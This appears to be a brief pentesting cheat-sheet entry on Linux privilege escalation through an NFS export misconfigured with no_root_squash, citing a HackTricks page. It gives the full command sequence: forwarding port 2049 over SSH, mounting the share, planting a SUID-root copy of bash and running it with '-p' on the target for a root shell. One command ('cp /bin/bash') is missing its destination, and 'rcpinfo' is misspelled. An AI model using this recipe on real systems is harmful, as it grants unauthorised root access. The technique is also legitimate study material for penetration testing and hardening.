# NFS 
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

When running `linpeas.sh` or similar, we can look for the `no_root_squash` attribute on a NFS directory.

We can then route our local port 2049 (`rcpinfo -p`) with ssh like so:
```
ssh USER@MACHINE -i ID_RSA_FILE -L 2049:localhost:2049
```

Then we can mount the directory to a local folder:

```
sudo mount -v -t nfs localhost:/ /NEW_DIR
```

List the directory after switching to root.

```shell-session
su
cd /NEW_DIR
ls -al 
```

Copy `/bin/bash` over and set SUID bit.

```shell-session
cp /bin/bash
chmod +s bash

(on remote machine)
./bash -p 
```

`-p` is privileged mode. 